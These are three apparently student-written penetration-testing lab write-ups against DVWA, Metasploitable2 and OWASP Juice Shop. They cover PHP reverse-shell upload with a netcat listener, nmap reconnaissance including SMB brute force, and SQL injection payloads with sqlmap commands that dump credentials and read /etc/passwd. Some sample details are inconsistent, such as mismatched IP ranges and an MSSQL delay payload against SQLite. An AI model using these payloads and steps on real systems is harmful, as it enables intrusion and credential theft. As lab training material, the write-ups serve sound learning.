# PHP Reverse Shell Attack - Mohammad

## Program

DVWA vulnerable web application; PHP reverse shell payload; netcat for listener on KALI.

## Command

- Reconnaissance: Identify network hosts  
   Command: `sudo netdiscover -r 192.168.1.0/24`
- Target fingerprinting: Scan open ports and services on DVWA host  
   Command: `nmap -sV <TARGET_IP>`
- Payload creation: Use the provided webshell (php-revers-shell.php) from KALI.  
  Note: Copy the file php-revers-shell.php, modify the target machine and set your KALI IP, then upload it to DVWA.
- Listener set on KALI: Wait for incoming connection  
   Command: `nc -lvp 4444`
- Trigger payload: Access the PHP file via browser or using curl  
   Command: `curl http://<TARGET_IP>/upload/shell.php`

## Example

- netdiscover output sample:
  ```
  Currently scanning: 192.168.1.0/24   |   Screen View: Unique Hosts
  2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 120
  _________________________________________________________________________
     IP            At MAC Address      Count     Len  MAC Vendor / Hostname
  192.168.1.101   00:0c:29:xx:xx:xx    2         120  VMware, Inc.
  10.30.0.235   00:50:56:xx:xx:xx    1         60   VMware, Inc.
  ```

## Target

- DVWA host (e.g., 10.30.0.235)

## Objective

- Gain remote shell access via PHP reverse shell exploiting DVWA file upload vulnerability.

## Type of Attack

- PHP Reverse Shell exploitation

## Attack steps and screenshots

1. **Reconnaissance**
   - Use netdiscover to enumerate hosts on the network (see netdiscover command above and sample output).
   - Identify potential target IPs from the network scan.
2. **DVWA Discovery**

   - Scan the network for HTTP services on common web ports (80 and 443) to locate DVWA.
   - Command example: `nmap -p 80,443 --open 192.168.1.0/24`
   - Verify DVWA by browsing to the login page (e.g., http://<TARGET_IP>/login.php).

3. **Target Identification**

   - Run an nmap scan against the identified DVWA host to confirm open ports and running services.
   - Example command: `nmap -sV 10.30.0.235`
   - Note the web server and PHP version for potential vulnerabilities.

4. **Payload Creation and Upload**

   - Copy the provided KALI webshell (php-revers-shell.php), modify it by replacing the target machine IP and setting your KALI IP.
   - Log in to DVWA, navigate to the file upload section, and upload the modified php-revers-shell.php.
   - Ensure the upload is successful and the file is accessible via the web.

5. **Listener Setup on KALI**

   - On the KALI host, open a netcat listener on port 4444 using:  
     `nc -lvp 4444`
   - Prepare to receive the reverse shell connection from the DVWA host.

6. **Execution Trigger**

   - Access the uploaded PHP file from a browser or via curl to trigger the reverse shell.
   - Example: `curl http://10.30.0.235/upload/shell.php`
   - Check the netcat listener for an incoming shell connection.
   - If the connection is successful, you should see a shell prompt in the netcat listener.

7. **Post-Exploitation (Screenshots and Verification)**
   - Once the reverse shell connects, capture screenshots of the terminal showing a successful shell.
   - Document any banner or system information for further pivoting.
   - Example commands to run after gaining shell access:
     - `whoami` - to check the current user.
     - `uname -a` - to get system information.
     - `cat /etc/passwd` - to view the password file (if permission allows).

---

# Nmap Information Gathering Attack - Mohammad

## Program

Kali Linux as attacking machine; Metasploitable2 as vulnerable target; Nmap for reconnaissance and vulnerability assessment.

## Command

- Network discovery: Identify live hosts on network
  Command: `nmap 192.168.1.0/24`
- Ping sweep: Quick host discovery
  Command: `nmap -sn 192.168.1.0/24`
- Port scanning: Identify open services
  Command: `nmap -p 1-1024 10.30.0.235`
- Service version detection: Fingerprint running services
  Command: `nmap -sV -T4 10.30.0.235`
- OS detection: Identify target operating system
  Command: `sudo nmap -O 10.30.0.235`
- Vulnerability scanning: Check for known vulnerabilities
  Command: `sudo nmap --script vuln 10.30.0.235`
- SMB enumeration: Gather SMB service information
  Command: `nmap --script smb-enum-shares,smb-enum-users 10.30.0.235`

## Example

- Network scan output sample:
  ```
  Nmap scan report for 10.30.0.235
  Host is up (0.00023s latency).
  Not shown: 977 closed ports
  PORT     STATE SERVICE
  21/tcp   open  ftp
  22/tcp   open  ssh
  23/tcp   open  telnet
  25/tcp   open  smtp
  53/tcp   open  domain
  80/tcp   open  http
  139/tcp  open  netbios-ssn
  445/tcp  open  microsoft-ds
  ```

## Target

- Metasploitable2 VM (10.30.0.235)

## Objective

- Perform comprehensive reconnaissance and information gathering to identify potential attack vectors on Metasploitable2.

## Type of Attack

- Information Gathering and Reconnaissance

## Attack steps and screenshots

### Task 1: Information Gathering with Nmap

**Connectivity Test:**
| IP address of Kali | IP address of Metasploitable | Result of connectivity Test |
|-------------------|------------------------------|----------------------------|
| 192.168.1.114 | 10.30.0.235 | Successful ping response |

**Step 1: Basic Nmap Usage**

1. Check Nmap manual and usage: `man nmap`
2. Basic target scan: `nmap 10.30.0.235`

**Step 2: Network Scanning**

- Scan entire subnet: `nmap 192.168.1.0/24`
- Note: Generates significant network traffic in production environments

**Activity 1: Ping Sweep**

- Command: `nmap -sn 192.168.1.0/24`
- Purpose: Identify live hosts without port scanning

**Step 3: Specific Port Scanning**

- Single port scan: `nmap -p 80 10.30.0.235`
- Multiple ports: `nmap -p 21,22,80 10.30.0.235`

**Activity 2: Port-Specific Scanning**

1. FTP port scan: `nmap -p 21 10.30.0.235`
2. SSH and HTTP ports: `nmap -p 22,80 10.30.0.235`

**Step 4: Advanced Scanning Options**

- Port range scanning: `nmap -p 1-1024 10.30.0.235`
- Multiple targets: `nmap -p 1-1024 10.30.0.235 192.168.1.114`
- Top ports scan: `nmap --top-ports 5 10.30.0.235`

**Activity 3: Popular Ports**

- Top 10 ports: `nmap --top-ports 10 10.30.0.235`

**Step 5: File-Based Scanning**

1. Create target file: `nano target.txt`
2. Add target IPs to file
3. Scan from file: `nmap -iL target.txt`

**Activity 4: Multiple Port Scanning**

- Specific ports from file: `nmap -p 21,23,139,445 -iL target.txt`

**Step 6: Target Exclusion**

- Exclude specific targets: `nmap -iL target.txt --exclude <TARGET_IP>`

**Activity 5: Exclusion Rationale**

- Reason: Avoid scanning critical production systems or authorized infrastructure

**Step 7: Output Saving**

- Normal format: `sudo nmap -iL target.txt -oN scan.txt`
- XML format: `sudo nmap -iL target.txt -oX output.xml`
- Grepable format: `sudo nmap -iL target.txt -oG scan.grep`

**Activity 6: XML Output**

- Command: `nmap -p 22,80,443 -iL target.txt -oX output.xml`

**Step 8: OS Detection**

- Command: `sudo nmap -O 10.30.0.235`
- Alternative: `sudo nmap -A 10.30.0.235` (includes OS, version, scripts, traceroute)

**Step 9: Service Version Detection**

- Command: `nmap -sV -T4 10.30.0.235`
- Purpose: Identify service versions for vulnerability assessment

**Step 10: TCP SYN (Stealth) Scan**

- Command: `sudo nmap -v -sS -p 80,443 10.30.0.235`
- Purpose: Avoid completing TCP three-way handshake for stealth

**Step 11: Protocol-Specific Scanning**

- TCP Connect scan: `nmap -sT 10.30.0.235 -T4 -v`
- UDP scan only: `sudo nmap -sU 10.30.0.235 -T4 --top-ports 5`
- Combined TCP/UDP: `sudo nmap -sS -sU 10.30.0.235 -T4 -v`

**Step 12: Nmap Scripting Engine (NSE)**

- List available scripts: `ls /usr/share/nmap/scripts`
- HTTP enumeration: `sudo nmap -p 80,8180 --script http-enum.nse 10.30.0.235`
- Vulnerability scan: `sudo nmap --script vuln 10.30.0.235`
- Default scripts: `nmap -sC 10.30.0.235`

**Activity 7: SMB Enumeration Scripts**

1. **Programming Language:** Lua
2. **SMB OS Discovery:** `nmap --script smb-os-discovery 10.30.0.235`
   - Purpose: Identifies OS version through SMB protocol
3. **SMB User Enumeration:** `nmap --script smb-enum-users 10.30.0.235`
   - Purpose: Lists user accounts on target system
4. **SMB Share Enumeration:** `nmap --script smb-enum-shares 10.30.0.235`
   - Purpose: Discovers shared folders and permissions
5. **SMB Brute Force:** `nmap --script smb-brute 10.30.0.235`
   - Purpose: Attempts to brute force SMB credentials

### Post-Reconnaissance Analysis

- Document all discovered services and versions
- Identify potential vulnerabilities based on service versions
- Plan subsequent exploitation phases based on findings
- Prioritize targets based on criticality and exploitability

---

# OWASP Juice Shop SQL Injection Attack - Mohammad

## Program

OWASP Juice Shop vulnerable web application; Burp Suite for request interception; Browser for manual testing; SQLMap for automated exploitation.

## Command

- Target discovery: Identify Juice Shop instance
  Command: `nmap -p 3000 192.168.1.0/24`
- Login bypass attempt: Basic SQL injection
  Payload: `admin@juice-sh.op'--`
- Union-based injection: Extract database information
  Payload: `' UNION SELECT sql FROM sqlite_master--`
- Automated scanning: Use SQLMap for comprehensive testing
  Command: `sqlmap -u "http://192.168.1.100:3000/rest/user/login" --data="email=test&password=test" --level=5 --risk=3`
- Database enumeration: Extract user credentials
  Command: `sqlmap -u "http://192.168.1.100:3000/rest/user/login" --data="email=test&password=test" --dump`

## Example

- Successful login bypass response:

  ```json
  {
    "authentication": {
      "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...",
      "bid": 1,
      "umail": "admin@juice-sh.op"
    }
  }
  ```

- Database structure discovery:
  ```
  Database: main
  Table: Users
  [12 entries]
  +----+------------------+--------------------------------------------------------------+
  | id | email           | password                                                      |
  +----+------------------+--------------------------------------------------------------+
  | 1  | admin@juice-sh.op| 0192023a7bbd73250516f069df18b500                            |
  | 2  | jim@juice-sh.op  | ncc-1701                                                     |
  +----+------------------+--------------------------------------------------------------+
  ```

## Target

- OWASP Juice Shop application (e.g., http://192.168.1.100:3000)

## Objective

- Exploit SQL injection vulnerabilities to bypass authentication, extract sensitive data, and demonstrate database compromise in OWASP Juice Shop.

## Type of Attack

- SQL Injection (Authentication Bypass and Data Extraction)

## Attack steps and screenshots

### Task 1: Environment Setup and Target Identification

**Connectivity Test:**
| Attacker IP | Target Application | Port | Status |
|-------------|-------------------|------|--------|
| 192.168.1.114 | 192.168.1.100 | 3000 | Active |

**Step 1: Target Discovery**

1. Network scan for Juice Shop: `nmap -p 3000 192.168.1.0/24`
2. Verify application access: Browse to `http://192.168.1.100:3000`
3. Confirm Juice Shop welcome page and login functionality

### Task 2: Manual SQL Injection Testing

**Step 2: Login Page Analysis**

1. Navigate to login page: `http://192.168.1.100:3000/#/login`
2. Examine login form parameters (email, password)
3. Test for basic input validation

**Step 3: Authentication Bypass Attempts**

**Activity 1: Comment-Based Injection**

1. **Payload:** `admin@juice-sh.op'--`
2. **Password:** `anything`
3. **Expected Result:** Successful login bypassing password check
4. **Explanation:** Double dash comments out password validation in SQL query

**Activity 2: Boolean-Based Injection**

1. **Payload:** `' OR 1=1--`
2. **Password:** `test`
3. **Purpose:** Test if application is vulnerable to basic OR injection

**Activity 3: Union-Based Information Gathering**

1. **Payload:** `' UNION SELECT sql FROM sqlite_master--`
2. **Purpose:** Extract database schema information
3. **Target:** Identify table structures and column names

### Task 3: Automated SQL Injection with SQLMap

**Step 4: SQLMap Configuration**

1. Start Burp Suite proxy
2. Configure browser to use Burp proxy (127.0.0.1:8080)
3. Capture a legitimate login request

**Step 5: Initial SQLMap Scan**

```bash
sqlmap -u "http://192.168.1.100:3000/rest/user/login" \
       --data="email=test@test.com&password=test" \
       --method=POST \
       --level=5 \
       --risk=3 \
       --batch
```

**Activity 4: Database Fingerprinting**

- Command: `sqlmap -u "http://192.168.1.100:3000/rest/user/login" --data="email=test&password=test" --fingerprint`
- Purpose: Identify database type and version

**Step 6: Database Enumeration**

**Activity 5: List Databases**

```bash
sqlmap -u "http://192.168.1.100:3000/rest/user/login" \
       --data="email=test&password=test" \
       --dbs
```

**Activity 6: Extract Table Information**

```bash
sqlmap -u "http://192.168.1.100:3000/rest/user/login" \
       --data="email=test&password=test" \
       -D main \
       --tables
```

**Activity 7: Dump User Credentials**

```bash
sqlmap -u "http://192.168.1.100:3000/rest/user/login" \
       --data="email=test&password=test" \
       -D main \
       -T Users \
       --dump
```

### Task 4: Advanced Exploitation Techniques

**Step 7: Time-Based Blind SQL Injection**

1. **Payload:** `admin@juice-sh.op'; WAITFOR DELAY '00:00:05'--`
2. **Purpose:** Test for time-based blind SQL injection
3. **Observation:** Monitor response time for delays

**Step 8: File System Access (if applicable)**

```bash
sqlmap -u "http://192.168.1.100:3000/rest/user/login" \
       --data="email=test&password=test" \
       --file-read="/etc/passwd"
```

**Activity 8: Challenge Completion**

1. **Admin Login Challenge:** Successfully log in as administrator
2. **Data Export Challenge:** Extract user database information
3. **Document findings:** Screenshot successful attacks

### Task 5: Post-Exploitation Analysis

**Step 9: Credential Analysis**

1. Analyze extracted password hashes
2. Attempt hash cracking using tools like John the Ripper or Hashcat
3. Document weak passwords discovered

**Step 10: Impact Assessment**

1. **Data Compromised:** User emails, password hashes, personal information
2. **Business Impact:** Customer data breach, privacy violations
3. **Compliance Issues:** GDPR, PCI-DSS violations

**Activity 9: Evidence Collection**

- Screenshot successful login bypass
- Document extracted database contents
- Save SQLMap output files
- Create timeline of successful exploitation

### Mitigation Recommendations

1. **Input Validation:** Implement proper input sanitization
2. **Parameterized Queries:** Use prepared statements
3. **Least Privilege:** Database user should have minimal permissions
4. **Web Application Firewall:** Deploy WAF with SQL injection rules
5. **Regular Security Testing:** Implement automated security scanning

### Learning Objectives Achieved

- Understanding SQL injection attack vectors
- Hands-on experience with manual and automated testing
- Database enumeration and data extraction techniques
- Real-world impact assessment of SQL injection vulnerabilities
